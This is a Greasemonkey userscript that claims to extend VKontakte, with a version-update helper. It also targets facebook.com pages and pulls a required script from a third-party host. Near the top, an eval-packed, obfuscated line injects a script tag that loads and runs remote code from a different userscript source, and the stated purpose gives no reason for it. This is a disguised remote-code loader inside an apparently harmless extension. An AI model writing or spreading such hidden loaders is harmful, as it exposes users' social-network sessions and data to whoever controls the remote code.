// ==UserScript==
// @name           VkScripts by Koss Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://vkontakte.ru/id8510668
// @description    Расширение функционала ВКонтакте.ру
// @author         Константин Штукерт
// @version        0.0.1.3
// @include http://vkontakte.ru/*
// @require		http://vkkoss.comze.com/js/mainprog.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


  var SCRIPT_NAME = 'VkScripts by Koss';
  var SCRIPT_URL = 'http://userscripts.org/scripts/source/39153.user.js';
  var SCRIPT_VERSION = '0.0.1.3'; // DO NOT FORGET TO UPDATE!!!

/*
  This code is licenced under the GPL
  http://www.fsf.org/licensing/licenses/gpl.html
*/
  var GMHelper = {
    loaded : typeof unsafeWindow != 'undefined',
    aWindow : typeof unsafeWindow == 'undefined' ? window : unsafeWindow,
    
    getValue : function(name, defaultValue) {
      if (this.loaded) {
        return GM_getValue(name, defaultValue);
      }
    },
    
    setValue : function(name, value) {
      if (this.loaded) {
        GM_setValue(name, value.toString());
      }
    },
    
    getNamespace : function(aWindow, path) {
      var currentNamespace = aWindow;
      while(path.length > 0) {
        var nextNamespace = path.shift();
        if (typeof currentNamespace[nextNamespace] == 'undefined') {
          currentNamespace = currentNamespace[nextNamespace] = {};  
        }
      }
      return currentNamespace;
    },
    
    updateScript : function() {
    
      var sender = this;
    
      if (this.loaded) {
        this.setValue('version', SCRIPT_VERSION);
        var now = new Date();        
        var lastCheck = Date.parse(this.getValue('lastCheck', now));
        if ((now.getTime() - lastCheck) > 10) { //86400000
          GM_xmlhttpRequest( {
             method : 'GET',
             url : SCRIPT_URL,
             headers : {
               'User-Agent': navigator.userAgent,
               'Accept' : '*/*',
               'Range' : 'bytes=0-1000',
               'Cache-control' : 'no-cache',
               'Pragma' : 'no-cache'
             },
             onload : function(response) {
                if (response.status == 200) {
                  var matches = response.responseText.match(/^\s*\/\/\s*\@version\s+(.+?)\s*$/m);
                  if (matches != null) {
                    var currentVersion = sender.getValue('version', '0.0.1.3');
                    if (currentVersion != matches[1]) {
                      if (confirm('Доступна новая версия ' + SCRIPT_NAME +' ('+matches[1]+'). Хотите скачать?')) {
                        window.open(SCRIPT_URL, '_blank');
                      }
                      
                    } 
                  }
                }
             }
           });

        }
        this.setValue('lastCheck', now);
      }
    }
    
  }

GMHelper.updateScript();